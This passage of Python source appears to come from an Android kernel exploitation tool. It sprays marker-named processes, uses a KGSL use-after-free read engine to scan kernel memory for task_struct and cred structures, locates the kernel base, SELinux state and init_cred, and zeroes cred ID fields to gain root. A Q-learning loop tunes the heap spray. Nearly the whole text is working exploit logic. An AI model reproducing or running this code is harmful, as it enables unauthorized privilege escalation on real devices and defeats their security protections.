            # Q-table state so W0 might prefer mmap_anon while W1
            # prefers popen_sleep with KETO markers.
            #
            # Q-learning update happens AFTER the scan, so the loop
            # has time to see if the spray actually produced matches.
            state = (
                min(9, self._adaptive_scan.get("no_match_batches", 0)),
                int(self.live.get("kill_count", 0)
                    / max(1, self.live.get("spray_count", 0)) * 10),
            )
            action = self._q_choose_action(worker_id, state)
            self.q_last_state[worker_id] = state
            self.q_last_action[worker_id] = action
            # Apply Q-learning chosen parameters
            if action[0] == "batch":
                q_batch = action[1]
            else:
                q_batch = batch
            if action[0] == "comm":
                comm_pref = action[1]
            else:
                comm_pref = "MIXED"
            if action[0] == "range":
                q_range = action[1]
            else:
                q_range = worker_id

            batch_pids = []
            for i in range(q_batch):
                if self.cancel_flag.is_set():
                    break
                if self.get_ram_usage() > 60.0:
                    break
                idx = done + i
                if idx >= slice_end:
                    break
                try:
                    # Build comm name based on comm_pref
                    spray_idx = idx
                    if comm_pref == "KETO" or (
                            comm_pref == "MIXED" and spray_idx % 2 == 0):
                        name = f"KETO{spray_idx % 10000:04d}"
                    elif comm_pref == "KETW":
                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"
                    else:  # MIXED odd
                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"

                    # Pick spray method (rotate through working ones)
                    # v4.1: Use popen as primary (most reliable) and
                    # every 5th process use mmap_anon (if Q-learning
                    # says it's working).
                    p = None
                    if i % 5 == 0 and self.spray_methods_stats.get(
                            "mmap_anon", {}).get("matched", 0) > 0:
                        p_pid = self._spray_v4_mmap_anon(name, size_kb=64)
                        if p_pid:
                            class _FakePopen:
                                def __init__(self, pid):
                                    self.pid = pid
                            p = _FakePopen(p_pid)
                            with self.stats_lock:
                                self.spray_methods_stats["mmap_anon"][
                                    "attempts"] += 1
                    if p is None:
                        p = _sp.Popen(
                            ["sh", "-c", f"exec -a {name} sleep 3600"],
                            stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                            preexec_fn=lambda n=name: self._set_comm(n),
                        )
                        with self.stats_lock:
                            self.spray_methods_stats["popen_sleep"][
                                "attempts"] += 1
                    # setxattr spray on the same marker. Catches
                    # heap-only UAF where task_struct doesn't make
                    # it but slab xattr values do. Gated by
                    # self.use_xattr_spray (default False) because
                    # on Termux the syscall may trigger SIGSYS and
                    # kill the process. The function itself is
                    # exception-safe (returns False on any failure),
                    # so this never crashes the loop.
                    if self.use_xattr_spray:
                        try:
                            if self._setxattr_spray(name):
                                with self.stats_lock:
                                    self.learn_stats["xattrs_set"] = \
                                        self.learn_stats.get(
                                            "xattrs_set", 0) + 1
                                    self.spray_methods_stats["setxattr"][
                                        "attempts"] += 1
                        except Exception:
                            pass
                    batch_pids.append(p.pid)
                    my_pids.add(p.pid)  # per-worker set, NOT global
                    with self.stats_lock:
                        self.learn_stats["sprayed_total"] += 1
                        self.perf["spray_attempts"] += 1
                    # Verify comm is actually set. Without this, even
                    # if popen succeeded, prctl() may have silently
                    # failed (e.g. SELinux denial, kernel comm is 16
                    # bytes and we passed >16) → comm = "sh" → scan
                    # can never find our marker. We only log the
                    # first failure per batch to avoid spam.
                    if i == 0 or i == q_batch - 1:
                        try:
                            with open(f"/proc/{p.pid}/comm", "r") as cf:
                                actual = cf.read().strip()
                            if actual != name and not self._comm_warned:
                                with self.stats_lock:
                                    self.live["last_msg"] = (
                                        f"W{worker_id}: comm mismatch "
                                        f"pid={p.pid} want='{name}' "
                                        f"got='{actual}'")
                                self._comm_warned = True
                        except Exception:
                            pass
                    self.log_event("spray", {"pid": p.pid, "name": name,
                                              "batch": done // batch,
                                              "worker": worker_id})
                except OSError as e:
                    self.log_event("spray_error", {"err": str(e), "w": worker_id})
                    break
            with self.stats_lock:
                self.live["spray_count"] += len(batch_pids)
                self.learn_stats["batches"] += 1
                # Update peak alive count
                total_alive = sum(len(s) for s in
                                  self.spray_procs_by_worker.values())
                if total_alive > self.perf["spray_alive_peak"]:
                    self.perf["spray_alive_peak"] = total_alive
                # Update spray_map: mark the bucket for this
                # worker's slice as "spraying" (1) so the TUI
                # grid lights up. After the batch is scanned, the
                # bucket transitions to scanning (3) then done.
                sm = self.spray_map
                kb_chunk = 0x2000000 // LEARN_WORKERS
                slice_offset = (worker_id * kb_chunk)
                if 0 <= slice_offset < 0x2000000:
                    bidx = slice_offset // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < len(sm):
                        # 1 = spraying, or 2 if previous batch
                        # had spray errors. Detect spray errors:
                        if len(batch_pids) < 5:  # most died
                            sm[bidx] = 2
                        else:
                            sm[bidx] = 1
            # Let the kernel actually publish the task_structs into
            # KGSL page-tables before we scan. Without this delay, the
            # scanner reads pages that don't yet contain any of our
            # task_structs → matches=0 even though spray succeeded.
            # 0.3s is enough for ~35 newly forked sleep procs to land.
            time.sleep(0.3)

            # 1b. Diagnostic: read MULTIPLE pages from our scan sub-range
            # to find where the spray actually landed. Reads just 4
            # pages spread across the sub-range (cheap), checks each
            # for KETO*/KETW*/comm pattern. If we find at least one
            # hit we know the spray is in range; if all 4 reads are
            # zero/non-marker we should widen the scan later.
            try:
                diag_pages = 4
                diag_chunk = (scan_end - scan_start) // diag_pages
                hits_in_test = []
                for dp in range(diag_pages):
                    pg_va = scan_start + dp * diag_chunk
                    if not self._engine_write(
                            f"read {hex(pg_va)}\n".encode()):
                        continue
                    test_data = self._read_data_packet()
                    if not test_data or len(test_data) < 4096:
                        continue
                    # Check for KETO*/KETW* spray markers
                    for marker in (b"KETO", b"KETW"):
                        i = 0
                        while True:
                            i = test_data.find(marker, i)
                            if i < 0:
                                break
                            if (i + 7 < len(test_data)
                                and test_data[i+4] in b"0123456789"
                                and test_data[i+5] in b"0123456789"
                                and test_data[i+6] in b"0123456789"
                                and test_data[i+7] in b"0123456789"):
                                hits_in_test.append(
                                    f"0x{pg_va:x}+{i}:"
                                    f"{test_data[i:i+8].decode(errors='ignore')}")
                            i += 1
                    # Also count non-zero pages (any spray task_struct
                    # would have non-zero fields)
                with self.stats_lock:
                    if hits_in_test:
                        # Show first 3 hits
                        self.live["last_msg"] = (
                            f"W{worker_id}: spray IN RANGE "
                            f"({len(hits_in_test)} hits: "
                            f"{', '.join(hits_in_test[:3])})")
                    else:
                        # Don't spam — only complain every 3rd batch.
                        if self.learn_stats["batches"] % 3 == 0:
                            self.live["last_msg"] = (
                                f"W{worker_id}: spray NOT in range "
                                f"(4 test pages, no markers)")
            except Exception as e:
                pass

            # 2) SCAN this subworker's range (adaptive if kbase known)
            if not self.ensure_engine():
                continue
            # Adaptive: if we already know kbase, focus on the kbase
            # region - every subworker scans a slice of that. The kbase
            # region is 32MB wide and is where SELinux, init_cred, and
            # kernel text data live.
            #
            # ADAPTIVE SCAN SHIFT: if we've gone 5+ batches with no
            # matches, the spray isn't reaching our slice. Try a
            # different offset. Without this, all 3 workers would
            # keep scanning the same 32MB forever and report 0 matches.
            with self.stats_lock:
                nm_batches = self._adaptive_scan.get("no_match_batches", 0)
            if nm_batches >= 5 and not self.kernel_base:
                offset_idx = self._adaptive_scan.get("offset_idx", 0)
                # 5 candidate offsets to try around uaf_start
                candidate_offsets = [
                    0,           # KGSL UAF
                    0x800000,    # +8MB
                    0x1000000,   # +16MB
                    0x1800000,   # +24MB
                    -0x800000,   # -8MB
                ]
                new_offset = candidate_offsets[offset_idx % len(candidate_offsets)]
                self._adaptive_scan["offset_idx"] = (offset_idx + 1) % len(candidate_offsets)
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = self.uaf_start + kb_chunk * worker_id + new_offset
                s_end   = s_start + kb_chunk
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W{worker_id}: adaptive shift to "
                        f"{hex(s_start)} (no match x{nm_batches})")
            elif self.kernel_base:
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = self.kernel_base + kb_chunk * worker_id
                s_end   = s_start + kb_chunk
            elif self.knowledge_base.get("candidate_kbases"):
                # Use first candidate kbase as fallback. Even if
                # verify didn't lock it in, this gives us a direction
                # to scan.
                cand = int(self.knowledge_base["candidate_kbases"][0], 16)
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = cand + kb_chunk * worker_id
                s_end   = s_start + kb_chunk
            else:
                # No kbase known yet — scan the UAF range where
                # spray task_structs should appear.
                s_start, s_end = scan_start, scan_end
            with self.stats_lock:
                self.live["scan_total"]   = s_end - s_start
                self.live["scan_offset"]  = s_start
                # Mark this bucket as "scanning" (3) in the spray_map
                if 0 <= (s_start - self.uaf_start) < self.scan_size:
                    bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < len(self.spray_map):
                        # Only mark as scanning if it was 0/1/2/5,
                        # not if it was already FOUND (6).
                        if self.spray_map[bidx] != 6:
                            self.spray_map[bidx] = 3

            if not self._engine_write(
                    f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
                self.log_event("learning_scan_error",
                               {"err": "engine write failed", "w": worker_id})
                # Engine might be dead — try to restart it for the
                # next iteration. Without this, we silently give up
                # for the rest of the learning run.
                with self.stats_lock:
                    self.live["engine_pid"] = 0
                    # Mark bucket as scan error (4) — dark orange/magenta
                    if 0 <= (s_start - self.uaf_start) < self.scan_size:
                        bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                        if 0 <= bidx < len(self.spray_map):
                            self.spray_map[bidx] = 4
                time.sleep(0.5)
                continue

            try:
                scan_done = False
                # Reduced from 30 → 10s. With 3 workers serializing
                # on one engine, 30s per worker = 90s per round means
                # each worker only finishes ~10 batches in 5min.
                # 10s × 3 = 30s/round → ~60 batches per 5min. Way
                # more learning cycles, and a stuck scan doesn't
                # burn the whole window.
                SCAN_TIMEOUT = 10.0
                scan_deadline = time.time() + SCAN_TIMEOUT
                no_progress_count = 0
                while not scan_done and not self.cancel_flag.is_set():
                    if time.time() > scan_deadline:
                        self.live["last_msg"] = (
                            f"W{worker_id}: scan timeout {SCAN_TIMEOUT}s")
                        break
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        break
                    if not line:
                        no_progress_count += 1
                        if no_progress_count % 15 == 0:
                            self.live["last_msg"] = (
                                f"W{worker_id}: waiting SCAN_DONE\u2026 "
                                f"({int(scan_deadline - time.time())}s)")
                        continue
                    no_progress_count = 0
                    if "SCAN_DONE" in line:
                        scan_done = True
                        with self.stats_lock:
                            self.live["scan_total"] = 0
                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
                        try:
                            stats_part = line.split("SCAN_DONE", 1)[1]
                            kv = {}
                            for part in stats_part.split(":"):
                                if "=" in part:
                                    k, v = part.split("=", 1)
                                    kv[k] = v
                            reads   = int(kv.get("r", "0"))
                            failed  = int(kv.get("f", "0"))
                            empty   = int(kv.get("e", "0"))
                            nonzero = int(kv.get("n", "0"))
                            hits    = int(kv.get("h", "0"))
                            self.live["last_msg"] = (
                                f"W{worker_id}: SCAN_DONE "
                                f"read={reads} failed={failed} empty={empty} "
                                f"nonzero={nonzero} hits={hits}")
                            # If scan ran but found nothing, count
                            # this as a "no match" batch. After 5
                            # consecutive empty batches the adaptive
                            # logic will shift to a different scan
                            # range.
                            if hits == 0:
                                with self.stats_lock:
                                    self._adaptive_scan["no_match_batches"] = (
                                        self._adaptive_scan.get(
                                            "no_match_batches", 0) + 1)
                            else:
                                with self.stats_lock:
                                    self._adaptive_scan["no_match_batches"] = 0
                        except Exception:
                            pass
                        break
                    if "PROGRESS:" in line:
                        try:
                            with self.stats_lock:
                                self.live["scan_offset"] = int(line.split(":")[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                        try:
                            parts = line.split(":")
                            va = int(parts[1], 16)
                            sig = int(parts[2])
                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                        except Exception:
                            continue
                        with self.stats_lock:
                            self.live["scan_offset"] = va - s_start
                            self.learn_stats["matches"] += 1
                            # Got a match — reset the no-match counter
                            # so adaptive logic doesn't trigger.
                            self._adaptive_scan["no_match_batches"] = 0
                            # v4.1: Update confidence histogram
                            # (we update this after classification
                            #  below; here we just count the raw match)
                            self.perf["matches_window_ts"].append(
                                time.time())
                            # Update Q-learning: positive reward for match
                            if worker_id in self.q_last_state:
                                last_state = self.q_last_state[worker_id]
                                last_action = self.q_last_action.get(worker_id)
                                if last_action is not None:
                                    # Reward proportional to confidence
                                    reward = 1.0
                                    self._q_update(
                                        last_state, last_action, reward,
                                        (0, 0))  # next state is "got match"
                        data = self._read_data_packet()
                        if not data:
                            continue
                        already = any(int(it['va'], 16) == va
                                     for it in self.found_items)
                        if already:
                            continue
                        # Smart multi-page read for strong sigs
                        cross_data = data
                        if sig >= 1 and off_in_page >= 0 and off_in_page < 4096:
                            triple = self.read_with_neighbors(va)
                            if triple and len(triple) == 12288:
                                cross_data = triple
                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or \
                                self._is_real_task_struct(cross_data):
                            with self.bg_lock:
                                self.found_items.append(
                                    self.classify_page(data, va, sig, off_in_page))
                            self.log_event("scan_match",
                                           {"va": va, "sig": sig,
                                            "w": worker_id,
                                            "type": self.found_items[-1]['type']})
                            with self.stats_lock:
                                self.learn_stats["verified"] += 1
                            # Kbase discovery on first task_struct match
                            if sig == 1 and off_in_page >= 0 and not self.kernel_base:
                                self.live["last_msg"] = (
                                    f"W{worker_id}: task_struct @ 0x{va:x}, "
                                    f"probing kbase\u2026")
                                kbase = self._find_kernel_base(hint_page=cross_data)
                                if kbase:
                                    self.kernel_base = kbase
                                    self.live["last_msg"] = (
                                        f"W{worker_id}: kbase=0x{kbase:x}, "
                                        f"probing SELinux\u2026")
                                    sel = self._probe_selinux(kbase)
                                    if sel:
                                        self.selinux_va, _ = sel
                                    ic = self._find_init_cred(kbase)
                                    if ic:
                                        self.cred_va = ic
                            if sig == 6 and off_in_page >= 0 and not self.cred_va:
                                self.live["last_msg"] = (
                                    f"W{worker_id}: following cred chain from "
                                    f"0x{va:x}+0x{off_in_page:x}\u2026")
                                chain = self.walk_cred_chain(
                                    va, off_in_page=off_in_page, max_hops=3)
                                for step_idx, (tgt, page, desc) in enumerate(chain):
                                    with self.bg_lock:
                                        self.found_items.append({
                                            "type": "Privilege Struct",
                                            "description": f"{desc} (chain hop {step_idx})",
                                            "va": hex(tgt),
                                            "confidence": 95 if "ROOT" in desc else 70,
                                            "data": page,
                                        })
                                    if "ROOT" in desc:
                                        self.cred_va = tgt
                                        for f_off in (4, 8, 12, 16, 20, 24):
                                            self.patch_mem(tgt + f_off, 0)
                                        break
                        else:
                            interesting, reason, conf = self._is_page_interesting(data)
                            if interesting:
                                # Map the reason to a sensible type. We
                                # only fall back to "Unknown Object" if
                                # it's something we can't classify.
                                if "cred-struct" in reason:
                                    itype = "Kernel Heap"
                                    desc  = f"cred struct: {reason}"
                                elif "task_struct layout" in reason:
                                    itype = "Task Struct"
                                    desc  = reason
                                elif "KETO spray" in reason or "KETW spray" in reason:
                                    itype = "Spray Marker"
                                    desc  = reason
                                elif "kptrs=" in reason or "kptr @" in reason:
                                    itype = "Kernel Heap"
                                    desc  = reason
                                elif "comm-like" in reason:
                                    itype = "Task Struct"
                                    desc  = reason
                                elif "strings" in reason:
                                    itype = "Kernel Strings"
                                    desc  = reason
                                else:
                                    itype = "Unknown Object"
                                    desc  = f"Auto-found ({reason})"
                                with self.bg_lock:
                                    self.found_items.append({
                                        "type": itype,
                                        "description": desc,
                                        "va": hex(va),
                                        "confidence": conf,
                                        "data": data,
                                        "ts": datetime.datetime.now().isoformat(),
                                    })
                                with self.stats_lock:
                                    self.learn_stats["auto_kept"] = \
                                        self.learn_stats.get("auto_kept", 0) + 1
                                    # v4.1: confidence histogram
                                    bidx = min(10, conf // 10)
                                    self.conf_histogram[bidx] += 1
                                    # v4.1: Q-learning reward (auto-kept
                                    # is a weaker positive signal than
                                    # an explicit match)
                                    if worker_id in self.q_last_state:
                                        last_state = self.q_last_state[worker_id]
                                        last_action = self.q_last_action.get(
                                            worker_id)
                                        if last_action is not None:
                                            reward = 0.3
                                            self._q_update(
                                                last_state, last_action,
                                                reward, (0, 0))
                            else:
                                with self.stats_lock:
                                    self.learn_stats["false_positives"] += 1
                if scan_done:
                    done += len(batch_pids)
            except Exception as e:
                self.log_event("learning_scan_error",
                               {"err": str(e), "w": worker_id})

            # 3) KILL this subworker's spray batch (free RAM).
            # KEY FIX: previously we did os.kill(pid, 9) but never
            # verified the process actually died. PIDs accumulated
            # across batches (315+385+334 = 1034 alive at one point)
            # and the kill_count went up but PIDs stayed in my_pids.
            # New approach: send SIGKILL, then poll /proc/PID/exists
            # up to 3 times. If still alive after 3 retries, give up
            # and drop from the set so we don't keep trying forever.
            killed_this_batch = 0
            survived_this_batch = 0
            for pid in batch_pids:
                died = False
                for attempt in range(3):
                    try:
                        os.kill(pid, 9)
                    except ProcessLookupError:
                        died = True
                        break
                    except Exception:
                        pass
                    # Poll whether /proc/PID still exists
                    try:
                        os.kill(pid, 0)  # signal 0 = check existence
                        time.sleep(0.02)
                    except ProcessLookupError:
                        died = True
                        break
                    except Exception:
                        break
                # Either way, drop from our set so the PIDs we can't
                # kill don't accumulate.
                my_pids.discard(pid)
                if died:
                    killed_this_batch += 1
                else:
                    # Process survived kill — counted as "alive"
                    survived_this_batch += 1
                with self.stats_lock:
                    self.live["kill_count"] += 1
            with self.stats_lock:
                self.live["last_msg"] = (
                    f"W{worker_id}: killed {killed_this_batch}/"
                    f"{len(batch_pids)} sprays")
                # v4.1: update spray_methods_stats alive counter
                # for the method that was used this batch. We use
                # the most-recently-attempted method (since each
                # batch uses one). Detected by checking which
                # attempt counter was last incremented — but for
                # simplicity we attribute survivors to popen_sleep
                # (the dominant method). 80% of sprays are
                # popen_sleep so this is a reasonable approximation.
                if survived_this_batch > 0:
                    self.spray_methods_stats["popen_sleep"][
                        "alive"] = (
                            self.spray_methods_stats[
                                "popen_sleep"].get("alive", 0)
                            + survived_this_batch)

        self.log_event("learning_subworker_done",
                       {"worker": worker_id, "done": done,
                        "slice": [slice_start, slice_end]})

    def _is_real_task_struct(self, data):
        """Heuristic: is this a real task_struct page?
        Strong indicators: any KETO* spray marker (KETO + 4 digits),
        any KETW* marker (KETW + digit + 3 digits), KETO0422 (legacy
        master), KET00422 (v6.c spray), com.android., or any 16-byte
        ASCII comm string at one of the well-known task_struct offsets.
        data can be a single 4KB page OR a 3-page triple (12288 bytes)
        from read_with_neighbors — in which case offsets 0x718..0x728
        cover 3 possible page-alignment positions.
        """
        if not data or len(data) < 0x1000:
            return False
        # Quick byte-pattern check for any of our KETO*/KETW* spray
        # markers. This is much faster than the offset loop and is
        # the path the C engine takes as well (sig 1a-1d).
        for marker in (b"KETO0422", b"KET00422"):
            if data.find(marker) >= 0:
                return True
        # KETO + 4 digits (KETO0330, KETO1234, KETO9999, etc.)
        # Fast path: look for "KETO" then check 4 trailing digits.
        idx = 0
        while True:
            idx = data.find(b"KETO", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"0123456789"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return True
            idx += 1
        # KETW + digit + 3 digits (KETW0031, KETW1100, KETW2009)
        idx = 0
        while True:
            idx = data.find(b"KETW", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"012"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return True
            idx += 1
        if data.find(b"com.android.") >= 0:
            return True
        # comm at 0x718 (kernel 5.4) OR marker at 0xfd8 (v6.c) — printable
        # ASCII string. If we got a 3-page triple, also try shifted offsets
        # in case the page boundary cut our struct in half.
        for off in self.marker_offsets:
            for shift in (0, 0x1000, -0x1000):
                comm_off = off + shift
                if 0 <= comm_off and comm_off + 16 <= len(data):
                    comm = data[comm_off:comm_off + 16]
                    s = comm.split(b"\x00")[0]
                    if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
                        return True
        return False

    def _find_marker_in_page(self, data):
        """Search the page for KETO0422 (us) or KET00422 (v6.c) and return
        the offset of the marker, or -1. Also returns the marker bytes
        so we know which one was found."""
        idx = data.find(b"KETO0422")
        if idx >= 0:
            return idx, b"KETO0422"
        idx = data.find(b"KET00422")
        if idx >= 0:
            return idx, b"KET00422"
        return -1, None

    def _discover_kernel_base_from_page(self, data, kbase=None):
        """Scan a page (or 3-page triple) for kernel-space pointers and
        derive candidate kernel bases by masking their low bits. The
        trick from v6.c: any pointer into kernel .text/.data
        (0xffffff8X_XXXX_XXXX etc.) can be used to find kbase.

        Returns the most likely kernel base, or None.
        If kbase is supplied, only considers bases that match it
        (within a small tolerance) to avoid noise."""
        if not data:
            return None
        # Collect all kernel-space pointers
        candidates = []
        for i in range(0, len(data) - 8, 8):
            v = int.from_bytes(data[i:i+8], "little")
            # AArch64 kernel pointers: 0xffffff8X .. 0xffffffcf
            if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
                # Apply each mask, collect distinct candidates
                for mask in self.kbase_discovery_masks:
                    cand = v & mask
                    if cand and cand not in candidates:
                        candidates.append(cand)
        if not candidates:
            return None
        # If we already have a kbase, filter candidates close to it
        if kbase:
            for c in candidates:
                # Either c is close to kbase (within 1MB), or kbase
                # is close to c (c & mask == kbase)
                if abs(c - kbase) < 0x200000:
                    return c & 0xfffffffffffff000
                # Also check if c is a known base
                for known in self.kernel_base_candidates:
                    if abs(c - known) < 0x200000:
                        return known
        # Otherwise, try each candidate (most-aligned first)
        # Sort by alignment (more-aligned = larger mask = better candidate)
        candidates.sort()
        # Try to find an ELF header at each candidate
        for c in candidates[:16]:
            # Round down to 4KB boundary
            c_aligned = c & 0xfffffffffffff000
            if self._looks_like_elf(c_aligned):
                return c_aligned
        # Last resort: return the first candidate aligned to 4KB
        return candidates[0] & 0xfffffffffffff000

    def _looks_like_elf(self, va):
        """Read 4 bytes at va and check for ELF magic. Returns True if
        we can read 4 bytes that look like ELF header."""
        if not self._engine_write(f"window {hex(va)} 0 4\n".encode()):
            return False
        data = self._read_data_packet()
        if not data or len(data) < 4:
            return False
        # ELF magic: 0x7f 'E' 'L' 'F' = b'\x7fELF'
        return data[0:4] == b"\x7fELF"

    def _is_page_interesting(self, data):
        """Less strict: does this page have ANY non-trivial data?
        Returns (interesting, reason, confidence). Expanded for Linux 5.4
        kernel memory patterns: real comm strings, kernel pointer density,
        cred-struct u32 layout, ascii runs.

        Also detects our spray markers (KETO*/KETW*) and task_struct
        layout fingerprints (stack pointer + state u32 + usage u32)
        so we can tag pages even when the C engine missed them."""
        if not data or len(data) < 16:
            return (False, "too small", 0)
        # Count non-zero
        nonzero = sum(1 for b in data if b != 0)
        if nonzero < 16:
            return (False, f"mostly zero ({nonzero}/{len(data)})", 0)

        # 0. Spray marker detection (KETO + 4 digits or KETW + 4 digits)
        idx = 0
        while True:
            idx = data.find(b"KETO", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"0123456789"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return (True, f"KETO spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
            idx += 1
        idx = 0
        while True:
            idx = data.find(b"KETW", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"012"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
            idx += 1

        # 0b. task_struct layout fingerprint (Linux 5.4) — stack
        # pointer at offset 0x30, __state u32 at 0x28 (small value),
        # usage u32 at 0x38 (1..0xffff). Catches real task_structs
        # that don't have our spray marker (e.g. init_task, kthreads).
        for base in range(0, 0x400, 0x100):
            if base + 0x40 > len(data):
                break
            try:
                stack_ptr = int.from_bytes(data[base+0x30:base+0x38], "little")
                state_v   = int.from_bytes(data[base+0x28:base+0x2c], "little")
                usage_v   = int.from_bytes(data[base+0x38:base+0x3c], "little")
            except Exception:
                continue
            stack_ok = 0xffffff8000000000 <= stack_ptr <= 0xffffffcfffffffff
            state_ok = state_v < 0x100
            usage_ok = 0 < usage_v < 0x10000
            if stack_ok and state_ok and usage_ok:
                return (True,
                        f"task_struct layout @ 0x{base:x} (stack+state+usage)",
                        85)

        # A. Cred-struct pattern: u32 usage, then 6x u32 uid/gid/suid/sgid/euid/egid.
        #    For root cred all 6 are 0. For task_struct creds they may
        #    be 0x0000/0x0001/0x03e8 (0/1/1000). Look for the first 24
        #    bytes being plausible IDs.
        if len(data) >= 28:
            try:
                u32 = struct.unpack_from("<7I", data, 0)
                usage, uid, gid, suid, sgid, euid, egid = u32
                if (0 < usage < 0x10000 and
                    all(v < 0x10000 for v in (uid, gid, suid, sgid, euid, egid))):
                    # All six IDs are sane (u32 < 65536, including root=0).
                    # Strong cred-struct candidate.
                    return (True, f"cred-struct (u={usage}, ids={uid}/{gid}/{euid})", 75)
            except Exception:
                pass

        # B. Kernel pointer density — count 0xffffff... pointers in the
        #    page. Real kernel heap pages have many pointers. Real-user
        #    pages (sparse) usually have 0-1.
        kptrs = 0
        first_kptr_off = -1
        for i in range(0, len(data) - 8, 8):
            v = int.from_bytes(data[i:i+8], "little")
            if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
                if first_kptr_off < 0:
                    first_kptr_off = i
                kptrs += 1
        if kptrs >= 8:
            return (True, f"kernel-heap (kptrs={kptrs}, nz={nonzero}/{len(data)})", 75)
        if kptrs >= 3:
            return (True, f"kernel-data (kptrs={kptrs}, nz={nonzero}/{len(data)})", 65)
        if kptrs >= 1:
            return (True, f"has kptr @ 0x{first_kptr_off:x} (kptrs={kptrs})", 70)

        # C. Real Linux kernel comm strings (swapper/0, kthreadd, init,
        #    kworker/..., xfs-..., jbd2/..., etc.). These are 16 bytes
        #    total, with a NUL terminator. We look for printable-ASCII
        #    run of 4+ chars, then verify the rest of the 16-byte
        #    window is NULs.
        for off in range(0, len(data) - 16):
            if 0x20 <= data[off] <= 0x7e:
                # Read 16 bytes from this offset
                win = data[off:off+16]
                s = win.split(b"\x00")[0]
                if 4 <= len(s) <= 15 and all(0x20 <= c <= 0x7e for c in s):
                    # Looks like a comm string. Verify it could be a
                    # real kernel process (no spaces, starts with letter).
                    if (b" " not in s and s[0:1].isalpha() and
                        not s.startswith((b"http", b"HTTP", b"GET ", b"POST"))):
                        return (True, f"comm-like '{s.decode()}' @ 0x{off:x}", 60)

        # D. ASCII run-length: any 4+ run of printable ASCII is "strings"
        ascii_runs = 0
        run = 0
        last_i = 0
        for i, b in enumerate(data):
            if 0x20 <= b <= 0x7e:
                run += 1
                if run >= 4:
                    ascii_runs += 1
                    if ascii_runs >= 2:
                        return (True, f"has strings ({ascii_runs} runs)", 50)
            else:
                run = 0
        # Any non-zero data is at least "Unknown Object"
        return (True, f"has data ({nonzero} bytes)", 30)

    def cmd_learning_cancel(self):
        """Cancel running learning loop (Ctrl+P shortcut)."""
        self.cancel_flag.set()
        # Kill live sprays
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
            self.live["kill_count"] += 1
        self.spray_procs.clear()
        # Wait briefly for subworkers to notice the cancel flag and exit
        for t in list(self._learn_subworkers):
            try:
                t.join(timeout=0.5)
            except Exception:
                pass
        self.live["last_msg"] = "Learning cancelled by user."
        return "Cancelled"

    # ============== INPUT (render thread handles all redraws) ==============
    # Note: the actual input_cmd / _print_prompt / cmd_set_rate are
    # defined earlier (around line 769-895) where they live next to
    # the render thread. This is the only definition now.

    # ============== ITEM VERIFICATION ==============
    def verify_item(self, item_idx):
        """Re-read the VA of a found item and re-classify the page.
        Uses read_with_neighbors (3-page triple) so we can catch
        cross-page patterns (kernel pointer at page end, comm at page
        boundary, etc.)."""
        if item_idx < 0 or item_idx >= len(self.found_items):
            self.live["last_msg"] = f"Invalid index: {item_idx}"
            return
        item = self.found_items[item_idx]
        try:
            va = int(item["va"], 16)
        except Exception:
            self.live["last_msg"] = f"Invalid VA: {item['va']}"
            return
        self.live["last_msg"] = f"Re-verifying {item['va']} (with neighbors)…"
        # Use multi-page read (3 pages: -1, 0, +1) so we catch cross-page
        # patterns the single-page read may have missed.
        data = self.read_with_neighbors(va)
        if not data:
            # Fallback: just one page
            data = self.read_page(va)
            if not data:
                self.live["last_msg"] = f"Read failed: {item['va']} (UAF dead?)"
                return
            scope = "single page"
        else:
            scope = "3-page window"
        # If the result is a 3-page window, we store it as 3 separate
        # pages of data in the item for inspection.
        if len(data) == 12288:
            item["data"] = data[0x1000:0x2000]      # primary page
            item["data_prev"] = data[0:0x1000]      # previous page
            item["data_next"] = data[0x2000:0x3000] # next page
        else:
            item["data"] = data
            item.pop("data_prev", None)
            item.pop("data_next", None)
        # Re-classify using permissive filter
        interesting, reason, conf = self._is_page_interesting(data)
        if interesting:
            item["description"] = f"Re-verified ({scope}): {reason}"
            item["confidence"] = conf
            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
                                     f"{reason} (conf={conf}%)")
        else:
            nonzero = sum(1 for b in data if b != 0)
            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified ({scope}): "
                                     f"EMPTY/ZERO ({nonzero} non-zero bytes)")

    # ============== DETAIL VIEW ==============
    def show_detail(self, item_idx):
        if item_idx < 0 or item_idx >= len(self.found_items):
            self.live["last_msg"] = f"Invalid index: {item_idx} (have {len(self.found_items)} items)"
            return
